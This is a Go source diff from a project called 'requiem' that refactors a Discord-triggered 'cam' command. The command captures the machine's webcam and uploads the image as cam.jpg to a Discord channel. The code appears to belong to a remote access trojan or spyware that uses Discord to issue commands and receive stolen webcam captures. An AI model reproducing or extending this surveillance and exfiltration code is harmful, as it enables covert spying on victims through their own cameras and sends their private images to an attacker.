@@ -4,19 +4,20 @@ import (
 	"fmt"
 
 	"requiem/funcs"
+	"requiem/store"
 
 	"github.com/bwmarrin/discordgo"
 )
 
-func (*CamCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*CamCommand) Exec(ctx *store.CommandContext, args []string) {
 	pic, err := funcs.CaptureWebcam()
 	if err != nil {
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to capture - %s", err), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to capture - %s", err))
 		return
 	}
 
-	ses.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
-		Reference: msg.Reference(),
+	ctx.SendComplexMsg(&discordgo.MessageSend{
+		Reference: ctx.Message.Reference(),
 		Files: []*discordgo.File{{
 			Name:   "cam.jpg",
 			Reader: pic,
